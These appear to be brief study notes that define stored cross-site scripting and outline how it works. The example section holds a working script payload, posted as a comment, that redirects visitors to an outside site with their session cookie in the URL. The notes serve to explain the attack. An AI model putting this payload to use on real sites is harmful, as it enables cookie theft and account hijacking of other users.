# Def: XSS is when hacker inject malicious scripts into web pages viewed by other users. These scripts can execute in the context of the user's browser, leading to a variety of harmful actions such as stealing cookies, session tokens, or other sensitive information, defacing websites, or redirecting users to malicious sites.

# Steps:
- Hacker inject script into database through form
- Other user access and is redirected to malicious websites or is prompted by sensitive infomation

# Example:
- The hacker use his account to inject script javascript to the system database by his comment in a post such as:
<script>
window.location = "https://unitop.vn?cookie=" + document.cookie;
 </script>

 - Other user access and redirect to this website and their cookie is stolen.